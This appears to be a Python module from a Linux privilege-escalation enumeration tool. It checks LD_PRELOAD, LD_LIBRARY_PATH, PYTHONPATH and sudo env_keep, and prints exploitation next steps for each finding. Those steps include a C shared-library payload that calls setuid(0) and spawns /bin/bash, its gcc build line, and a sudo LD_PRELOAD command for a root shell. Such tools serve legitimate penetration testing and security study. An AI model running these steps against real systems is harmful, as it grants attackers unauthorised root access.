import os
from core import vectors
from core.utils import run_command
from core.printer import (
    print_section, print_critical, print_high,
    print_info, print_not_found
)

VECTOR_NAME = vectors.ENV_VARIABLES


def run() -> list:
    print_section(VECTOR_NAME)
    results = []

    results += _check_ld_preload()
    results += _check_ld_library_path()
    results += _check_python_path()
    results += _check_sudo_env()

    if not results:
        print_not_found("Environment Variables", {
            "Checked": "LD_PRELOAD, LD_LIBRARY_PATH, PYTHONPATH, sudo env",
            "Result" : "No dangerous environment variable misconfigurations found"
        })
        return [{"vector": vectors.ENV_VARIABLES, "severity": "CLEAN", "count": 0}]

    return results


# ─────────────────────────────────────────────
# LD_PRELOAD Check
# ─────────────────────────────────────────────

def _check_ld_preload() -> list:
    ld_preload = os.environ.get("LD_PRELOAD", "")

    if not ld_preload:
        return []

    print_critical("LD_PRELOAD is Set", {
        "Value"    : ld_preload,
        "Risk"     : "Attacker can inject malicious shared library into any process",
        "Next Step": [
            "Create malicious shared library:",
            "#include <stdio.h>",
            "#include <sys/types.h>",
            "#include <stdlib.h>",
            "void _init() { setuid(0); system('/bin/bash'); }",
            "gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles",
            "LD_PRELOAD=/tmp/evil.so <any_sudo_command>"
        ],
        "Reference": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload"
    })
    return [{"vector": "LD_PRELOAD", "severity": "CRITICAL", "count": 1}]


# ─────────────────────────────────────────────
# LD_LIBRARY_PATH Check
# ─────────────────────────────────────────────

def _check_ld_library_path() -> list:
    ld_lib = os.environ.get("LD_LIBRARY_PATH", "")

    if not ld_lib:
        return []

    # Check if any path in LD_LIBRARY_PATH is writable
    paths    = [p.strip() for p in ld_lib.split(":") if p.strip()]
    writable = [p for p in paths if os.path.isdir(p) and os.access(p, os.W_OK)]

    if writable:
        print_critical("Writable LD_LIBRARY_PATH Directory Found", {
            "Value"    : ld_lib,
            "Writable" : writable,
            "Risk"     : "Can place malicious .so file — loaded by privileged processes",
            "Next Step": [
                "Find which library a sudo binary needs:",
                "ldd $(which <sudo_binary>)",
                "Create fake library with same name in writable path",
                "LD_LIBRARY_PATH=<writable_path> sudo <binary>"
            ],
            "Reference": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_library_path"
        })
        return [{"vector": "LD_LIBRARY_PATH", "severity": "CRITICAL", "count": 1}]

    print_info("LD_LIBRARY_PATH is Set", {
        "Value" : ld_lib,
        "Result": "Set but no writable directories found — low risk"
    })
    return [{"vector": "LD_LIBRARY_PATH", "severity": "INFO", "count": 1}]


# ─────────────────────────────────────────────
# PYTHONPATH Check
# ─────────────────────────────────────────────

def _check_python_path() -> list:
    python_path = os.environ.get("PYTHONPATH", "")

    if not python_path:
        return []

    paths    = [p.strip() for p in python_path.split(":") if p.strip()]
    writable = [p for p in paths if os.path.isdir(p) and os.access(p, os.W_OK)]

    if writable:
        print_critical("Writable PYTHONPATH Directory Found", {
            "Value"    : python_path,
            "Writable" : writable,
            "Risk"     : "Can place malicious Python module — imported by privileged scripts",
            "Next Step": [
                "Find which modules a sudo python script imports",
                "Create fake module with same name in writable PYTHONPATH dir",
                "Module will be loaded before real one — execute code as root"
            ],
            "Reference": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#python-library-hijacking"
        })
        return [{"vector": "PYTHONPATH", "severity": "CRITICAL", "count": 1}]

    print_info("PYTHONPATH is Set", {
        "Value" : python_path,
        "Result": "Set but no writable directories found — low risk"
    })
    return [{"vector": "PYTHONPATH", "severity": "INFO", "count": 1}]


# ─────────────────────────────────────────────
# Sudo env_keep Check
# ─────────────────────────────────────────────

def _check_sudo_env() -> list:
    """
    sudo config mein env_keep check karo.
    Agar LD_PRELOAD ya LD_LIBRARY_PATH preserved hai sudo ke saath
    toh direct privesc possible hai.
    """
    raw = run_command("sudo -l 2>/dev/null")

    if not raw:
        return []

    dangerous_vars = ["LD_PRELOAD", "LD_LIBRARY_PATH", "PYTHONPATH"]
    found = []

    for line in raw.splitlines():
        for var in dangerous_vars:
            if var in line and "env_keep" in line.lower():
                found.append(line.strip())

    if not found:
        return []

    print_critical("Sudo Preserves Dangerous Environment Variables", {
        "Entries"  : found,
        "Risk"     : "sudo keeps dangerous env vars — library injection as root possible",
        "Next Step": [
            "Set LD_PRELOAD to malicious library:",
            "sudo LD_PRELOAD=/tmp/evil.so <any_allowed_command>"
        ],
        "Reference": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload"
    })
    return [{"vector": "Sudo env_keep", "severity": "CRITICAL", "count": len(found)}]